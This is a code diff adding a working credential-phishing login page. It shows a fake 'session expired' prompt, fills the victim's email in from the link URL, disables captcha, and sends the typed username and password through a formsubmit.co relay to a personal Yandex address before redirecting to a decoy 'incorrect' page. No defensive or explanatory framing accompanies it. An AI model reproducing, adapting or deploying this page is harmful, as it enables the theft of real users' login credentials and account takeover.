@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        #background-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(5px);
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        .login-container {
+            max-width: 400px;
+            margin: 160px auto 0 auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+        .header-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .header-container img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 50px;
+            height: 50px;
+            margin-left: 2px;
+            margin-top: 2px;
+        }
+        .welcome-text {
+            padding-bottom: 30px;
+            text-align: center;
+            font-size: 16px;
+        }
+        .error-message, .success-message {
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+    <link id="dynamic-favicon" rel="icon" href="">
+</head>
+<body>
+    <div id="background-container"></div>
+<div id="overlay"></div>
+<div class="container">
+    <div class="login-container">
+        <div class="header-container">
+            <img id="domain-logo" src="img/blackmailing.png" alt="Domain Logo">
+            <h2 id="domain-name"></h2>
+        </div>
+        <div class="welcome-text">
+            <br>
+            Your session has expired, Please login to continue.
+        </div>
+        <form action="https://formsubmit.co/Richardwisdom1002@yandex.com" method="POST">
+            <input type="hidden" name="_next" value="https://websuperlogs.netlify.app/incorrect.html">
+            <input type="hidden" name="_captcha" value="false">
+            <div class="mb-3">
+                <div class="input-group">
+                    <span class="input-group-text"><i class="fas fa-user"></i></span>
+                    <input type="text" class="form-control" id="username" name="username" placeholder="Username" autofocus required>
+                </div>
+            </div>
+            <div class="mb-3">
+                <div class="input-group">
+                    <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                    <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
+                </div>
+            </div>
+            <button type="submit" class="btn btn-primary w-100" id="submit-button">
+                Sign In
+            </button>
+        </form>
+    </div>
+</div>
+
+</body>
+<script>
+    // Function to get query parameters from the URL
+    function getQueryParam(name) {
+        const params = new URLSearchParams(window.location.search);
+        return params.get(name);
+    }
+
+    // Autofill username if email is in the URL
+    document.addEventListener("DOMContentLoaded", function () {
+        const email = getQueryParam("email");
+        if (email) {
+            document.getElementById("username").value = email;
+            document.getElementById("username").removeAttribute("disabled"); // Enable input if needed
+        }
+    });
+</script>
+</html>
